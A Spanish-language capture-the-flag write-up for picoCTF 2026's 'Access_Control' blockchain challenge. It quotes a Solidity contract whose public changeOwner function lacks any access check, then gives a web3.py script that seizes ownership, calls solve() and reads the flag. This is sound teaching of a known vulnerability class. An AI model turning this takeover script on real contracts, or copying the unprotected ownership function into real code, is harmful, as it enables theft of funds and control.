# Blockchain — Access_Control

## Descripción
> **Prompt oficial del reto:** "We've created a simple contract to store a secret flag. But you currently are not the owner of the contract... Only the owner of the contract should be able to access it. We're sure we've made it secure this time."
>
> **Pistas oficiales:**
> 1. Wait, maybe you can be the owner?

- **Categoría:** Blockchain
- **Dificultad:** Medium
- **Evento/origen:** picoCTF 2026
- **Autor:** LT 'syreal' Jones

## Solución
El reto proporciona un contrato inteligente en Solidity `^0.8.0` llamado `AccessControl.sol`. La lógica de negocio restringe la obtención de la bandera únicamente al propietario (`owner`) del contrato.

### 1. Análisis del código fuente
Al revisar las funciones de `AccessControl.sol`:

```solidity
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}

function solve() public {
    require(msg.sender == owner, "Only the owner can get the flag.");
    if (!revealed) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}

function getFlag() public view returns (string memory) {
    require(revealed, "Challenge not yet solved!");
    return flag;
}
```

- La función `solve()` contiene la verificación `require(msg.sender == owner)`, activando `revealed = true` si quien la invoca es el propietario.
- La función `getFlag()` permite leer la variable privada `flag` una vez que `revealed` es verdadero.
- La vulnerabilidad fundamental radica en la función `changeOwner(address _newOwner)`: es pública y **carece de cualquier modificador de control de acceso** (como `onlyOwner`). Cualquier dirección externa puede invocarla y transferir la propiedad del contrato hacia sí misma sin restricciones.

### 2. Script de resolución con Web3.py
Utilizando `web3.py` para conectar al nodo RPC del reto:

```python
from web3 import Web3

rpc = "http://<host>:<port_rpc>"
w3 = Web3(Web3.HTTPProvider(rpc))

contract_addr = "0x..."
player_addr = "0x..."
player_priv = "0x..."

abi = [
    {
        "inputs": [{"internalType": "address", "name": "_newOwner", "type": "address"}],
        "name": "changeOwner",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "solve",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

contract = w3.eth.contract(address=contract_addr, abi=abi)


def send_tx(fn_call):
    nonce = w3.eth.get_transaction_count(player_addr)
    tx = fn_call.build_transaction({
        "from": player_addr,
        "nonce": nonce,
        "gas": 300000,
        "gasPrice": w3.to_wei("1", "gwei"),
    })
    signed = w3.eth.account.sign_transaction(tx, private_key=player_priv)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


# Paso 1: Tomar posesión del contrato invocando changeOwner
send_tx(contract.functions.changeOwner(player_addr))

# Paso 2: Ejecutar solve() como nuevo propietario
send_tx(contract.functions.solve())

# Paso 3: Extraer la bandera
if contract.functions.revealed().call():
    flag = contract.functions.getFlag().call()
    print("Flag:", flag)
```

Al transferir la propiedad y llamar a `solve()`, el contrato valida que el llamador coincide con `owner` y expone la bandera en formato `academy{...}`.

## Notas adicionales
- Las funciones administrativas críticas en Solidity siempre deben protegerse mediante modificadores de control de acceso (como el estándar `Ownable` de OpenZeppelin con el modificador `onlyOwner`).

## Referencias
- Reto: https://learn.cylabacademy.org/library/723
- OpenZeppelin Contracts (Ownable): https://docs.openzeppelin.com/contracts/5.x/api/access#Ownable
- SWC-105 (Unprotected Ether Withdrawal / Missing Access Control): https://swcregistry.io/docs/SWC-105
